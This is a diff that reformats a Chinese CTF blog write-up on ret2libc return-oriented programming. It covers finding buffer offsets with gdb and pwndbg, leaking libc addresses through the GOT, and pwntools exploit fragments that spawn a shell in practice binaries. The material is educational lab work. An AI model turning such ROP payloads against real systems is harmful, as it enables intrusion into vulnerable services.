@@ -1,13 +1,12 @@
 ---
 title: 「PWN」BasicROP　-　Ret2Libc
-tags: ['CTF', 'Pwn', ]
+tags: ["CTF", "Pwn"]
 authors: [nova]
-
 ---
 
 # Basic ROP - Ret2libc
 
-痛定思痛了属于是，连续几次比赛一题做不出来，得到了zbr爹的~~指~~指点~~点~~，决定自裁。
+痛定思痛了属于是，连续几次比赛一题做不出来，得到了 zbr 爹的~~指~~指点~~点~~，决定自裁。
 
 整。
 
@@ -15,11 +14,11 @@ authors: [nova]
 
 ## ret2libc1
 
-检查一下保护，没有Canary也没有PIE，32位ELF
+检查一下保护，没有 Canary 也没有 PIE，32 位 ELF
 
 ![](https://cdn.ova.moe/img/image-20211212102309182.png)
 
-在string列表里即看得到`system`也看得到`/bin/sh`
+在 string 列表里即看得到`system`也看得到`/bin/sh`
 
 ![](https://cdn.ova.moe/img/image-20211212102632678.png)
 
@@ -48,23 +47,23 @@ sh.interactive()
 
 说一下一些点
 
-- system的地址应取plt表里的system，而不是string里看到的那个system。原因参见PLT / GOT - 动态绑定
+- system 的地址应取 plt 表里的 system，而不是 string 里看到的那个 system。原因参见 PLT / GOT - 动态绑定
 
-- 这题中在IDA中可以看到`char s[100]; // [esp+1Ch] [ebp-64h] BYREF`，距离ebp是`0x64 bytes`，但实际上却是`0x6c bytes`
+- 这题中在 IDA 中可以看到`char s[100]; // [esp+1Ch] [ebp-64h] BYREF`，距离 ebp 是`0x64 bytes`，但实际上却是`0x6c bytes`
 
-  - 这里附上mark爹的解答
+  - 这里附上 mark 爹的解答
 
     ![](https://cdn.ova.moe/img/image-20211212105927823.png)
 
-  - 那如何计算偏移呢？这里提供gdb和pwndbg的两种方法
+  - 那如何计算偏移呢？这里提供 gdb 和 pwndbg 的两种方法
 
     - gdb
 
-      - 找到call _gets的地址，可以看到上面就是s
+      - 找到 call \_gets 的地址，可以看到上面就是 s
 
       ![](https://cdn.ova.moe/img/image-20211212110511113.png)
 
-      - 我们在0x0804867B这里下一个断点
+      - 我们在 0x0804867B 这里下一个断点
 
         ```shell
         gdb ./ret2libc
@@ -93,14 +92,14 @@ sh.interactive()
                 arg[1]: 0x0
                 arg[2]: 0x1
                 arg[3]: 0x0
-         
+
            0x8048683 <main+107>             mov    eax, 0
-           0x8048688 <main+112>             leave  
-           0x8048689 <main+113>             ret    
-         
-           0x804868a                        nop    
-           0x804868c                        nop    
-           0x804868e                        nop    
+           0x8048688 <main+112>             leave
+           0x8048689 <main+113>             ret
+
+           0x804868a                        nop
+           0x804868c                        nop
+           0x804868e                        nop
            0x8048690 <__libc_csu_init>      push   ebp
            0x8048691 <__libc_csu_init+1>    push   edi
            0x8048692 <__libc_csu_init+2>    xor    edi, edi
@@ -119,11 +118,11 @@ sh.interactive()
         ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
         ```
 
-        在寄存器[REGISTERS]中我们可以看到s的地址是`0xffffcf3c`，对于ESP的地址`0xffffcf20`的偏移是`0x1c`，这与我们在IDA中所看到的是一致的。同时，注意到EBP的地址`0xffffcfa8`，经过小学二年级的加减法即可得出EBP和ESP的偏移是`0x88`，那EBP与s的偏移也就是`0x88-0x1c = 0x6c`了，在IDA中却看到`[ebp-64h]`，不李姐
+        在寄存器[REGISTERS]中我们可以看到 s 的地址是`0xffffcf3c`，对于 ESP 的地址`0xffffcf20`的偏移是`0x1c`，这与我们在 IDA 中所看到的是一致的。同时，注意到 EBP 的地址`0xffffcfa8`，经过小学二年级的加减法即可得出 EBP 和 ESP 的偏移是`0x88`，那 EBP 与 s 的偏移也就是`0x88-0x1c = 0x6c`了，在 IDA 中却看到`[ebp-64h]`，不李姐
 
     - pwnbdg
 
-      这个我暂时没用太明白（），写完了去看看pwndbg的documents
+      这个我暂时没用太明白（），写完了去看看 pwndbg 的 documents
 
       - 首先生成点垃圾字符
 
@@ -136,10 +135,10 @@ sh.interactive()
 
         ```shell
         pwndbg> r
-        Starting program: /home/nova/Desktop/CTF/ctf-wiki/ret2libc/ret2libc1 
+        Starting program: /home/nova/Desktop/CTF/ctf-wiki/ret2libc/ret2libc1
         RET2LIBC >_<
         aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
-        
+
         Program received signal SIGSEGV, Segmentation fault.
         0x62616164 in ?? ()
         LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
@@ -157,7 +156,7 @@ sh.interactive()
         Invalid address 0x62616164
         ```
 
-      - 此时看到它给出了一个Invalid address
+      - 此时看到它给出了一个 Invalid address
 
         执行`cyclic -l addr`
 
@@ -166,17 +165,17 @@ sh.interactive()
         112
         ```
 
-        112就是s对于返回地址的偏移值（非常的Amazing啊）
+        112 就是 s 对于返回地址的偏移值（非常的 Amazing 啊）
 
-- system函数也有返回地址，所以在中间要补一个函数，`0xdeadbeef`是我自己的恶趣味（），写`p32(0)`或者`b"AAAA"`就可以了、
+- system 函数也有返回地址，所以在中间要补一个函数，`0xdeadbeef`是我自己的恶趣味（），写`p32(0)`或者`b"AAAA"`就可以了、
 
-- 32位传参就是从栈上从右向左拿参数，64位前六个参数则需是通过寄存器`rdi,rsi,rdx,rcx,r8,r9`的顺序传参，剩余的则按照32位从右向左取栈
+- 32 位传参就是从栈上从右向左拿参数，64 位前六个参数则需是通过寄存器`rdi,rsi,rdx,rcx,r8,r9`的顺序传参，剩余的则按照 32 位从右向左取栈
 
 ## ret2libc2
 
-这题在ret2libc1的基础上去掉了`binsh`字符串。也就是说，我们需要自己构建一个`gets`输入`/bin/sh`并作为`system`的参数引用。
+这题在 ret2libc1 的基础上去掉了`binsh`字符串。也就是说，我们需要自己构建一个`gets`输入`/bin/sh`并作为`system`的参数引用。
 
-在`vmmap`中可以看到data这个内存页是可写的
+在`vmmap`中可以看到 data 这个内存页是可写的
 
 ```shell
 0x804a000  0x804b000 rw-p     1000 1000   /home/nova/Desktop/CTF/ctf-wiki/ret2libc/ret2libc2
@@ -184,19 +183,19 @@ sh.interactive()
 
 ![](https://cdn.ova.moe/img/image-20211214121414814.png)
 
-那么我们考虑将`/bin/sh`写入到bss段上的`buf2`处
+那么我们考虑将`/bin/sh`写入到 bss 段上的`buf2`处
 
 ![image-20211214121848183](https://cdn.ova.moe/img/image-20211214121848183.png)
 
 思路很明显了：
 
-- 在程序的gets中覆盖返回地址到我们新的gets
-- 新的gets将输入存到buf2地址处，并返回到system函数
-- system函数调用buf2处的数据作为参数
+- 在程序的 gets 中覆盖返回地址到我们新的 gets
+- 新的 gets 将输入存到 buf2 地址处，并返回到 system 函数
+- system 函数调用 buf2 处的数据作为参数
 
-接下来就是如何编写payload
+接下来就是如何编写 payload
 
-给出两个exp。
+给出两个 exp。
 
 ### EXP1
 
@@ -221,11 +220,11 @@ sh.interactive()
 
 > `pop ebx; ret`
 >
-> `pop ebx`将栈顶数据取出存放至ebx，esp+4
+> `pop ebx`将栈顶数据取出存放至 ebx，esp+4
 >
-> `ret`将栈顶数据取出存放至eip，esp+4
+> `ret`将栈顶数据取出存放至 eip，esp+4
 >
-> 这样esp就指向了我们的`system_plt`，对应的，`0xdeadbeef`作为system的返回地址，随便填
+> 这样 esp 就指向了我们的`system_plt`，对应的，`0xdeadbeef`作为 system 的返回地址，随便填
 
 ### EXP2
 
@@ -252,17 +251,15 @@ sh.interactive()
 
 ## ret2libc3
 
-对于pwn来说，整明白了这个应该才算刚刚入门:(
+对于 pwn 来说，整明白了这个应该才算刚刚入门:(
 
-没有system，没有binsh，靠延迟绑定泄露已经执行过函数的真实地址算出偏移与基地址搞到system和binsh的地址
-
-
+没有 system，没有 binsh，靠延迟绑定泄露已经执行过函数的真实地址算出偏移与基地址搞到 system 和 binsh 的地址
 
 在这里我们泄露`puts`的地址好了
 
 ![](https://cdn.ova.moe/img/image-20211214151738631.png)
 
-首先搞到`puts`的plt和got表地址
+首先搞到`puts`的 plt 和 got 表地址
 
 ```python
 puts_plt = elf.plt['puts']
@@ -272,11 +269,11 @@ main_addr = elf.symbols['_start']
 
 覆盖`main`的返回地址到`puts`，参数为`puts_got`，返回到`main`
 
-> 我们返回到main时最好返回到`_start`，若返回到`main`的话，溢出的偏移会**-8bytes**
+> 我们返回到 main 时最好返回到`_start`，若返回到`main`的话，溢出的偏移会**-8bytes**
 >
 > > 程序入口`_start` -> `_libc_start_main` -> `main`
 
-因为puts已经调用过一次，所以此时`puts_got`表存的内容就是`puts`的真实地址
+因为 puts 已经调用过一次，所以此时`puts_got`表存的内容就是`puts`的真实地址
 
 ```python
 payload = b'A'*112
@@ -288,11 +285,11 @@ puts_addr = u32(sh.recv()[:4]) # 32位ELF，所以切前四位即可
 print("puts_addr: ", hex(puts_addr))
 ```
 
-此时我们可以算出libc的偏移值
+此时我们可以算出 libc 的偏移值
 
 `libc_base = puts_addr - libc.sys['gots']`
 
-有了偏移值，system和binsh的地址也就出来了
+有了偏移值，system 和 binsh 的地址也就出来了
 
 ### EXP1
 
@@ -368,15 +365,13 @@ sh.sendline(payload2)
 sh.interactive()
 ```
 
+### LIBC 版本查找
 
-
-### LIBC版本查找
-
-> 虽然说现在题基本上都有`libc.so`，但是以防万一还是给一个求libc版本的方法
+> 虽然说现在题基本上都有`libc.so`，但是以防万一还是给一个求 libc 版本的方法
 
 [libc database search](https://libc.blukat.me/)
 
-使用方法很简单，因为libc的低十二位不会变，所以给出已泄露的函数的地址，就可以在这里找到对应的libc.so版本及相关Offset
+使用方法很简单，因为 libc 的低十二位不会变，所以给出已泄露的函数的地址，就可以在这里找到对应的 libc.so 版本及相关 Offset
 
 ![image-20211214164955101](https://cdn.ova.moe/img/image-20211214164955101.png)
 
@@ -384,9 +379,9 @@ sh.interactive()
 
 [题目](https://buuoj.cn/challenges#ciscn_2019_c_1)
 
-大体上和ret2libc3相同，不过是64bits的，算是一个从32->64的转变的题目
+大体上和 ret2libc3 相同，不过是 64bits 的，算是一个从 32->64 的转变的题目
 
-直接上exp(本地)
+直接上 exp(本地)
 
 ```python
 from pwn import *
@@ -427,13 +422,10 @@ sh.interactive()
 
 几个需要注意的点：
 
-- 因为是64位，所以前面6个参数传参时候需要使用寄存器`rdi,rsi,rdx,rcx,r8,r9`，需要找ROPgadgets
+- 因为是 64 位，所以前面 6 个参数传参时候需要使用寄存器`rdi,rsi,rdx,rcx,r8,r9`，需要找 ROPgadgets
 
-- payload2当中的p64(ret)是为了堆栈平衡防止虚拟机崩溃（崩了八万次了），详情可看[「BUUCTF」Pwn - Rip Ubuntu18中64位ELF在调用system时候可能出现的问题](https://n.ova.moe/2021/11/29/BUUCTF-The-problem-I-met-in-RIP/)
-
-  
+- payload2 当中的 p64(ret)是为了堆栈平衡防止虚拟机崩溃（崩了八万次了），详情可看[「BUUCTF」Pwn - Rip Ubuntu18 中 64 位 ELF 在调用 system 时候可能出现的问题](https://nova.gal/2021/11/29/BUUCTF-The-problem-I-met-in-RIP/)
 
 # 特别感谢
 
-[Mark爹](https://blog.mark0519.com)可以说是手把手教了我GDB的用法，甚至录了个半小时的视频！直接三个响头的磕❤❤❤
-
+[Mark 爹](https://blog.mark0519.com)可以说是手把手教了我 GDB 的用法，甚至录了个半小时的视频！直接三个响头的磕 ❤❤❤
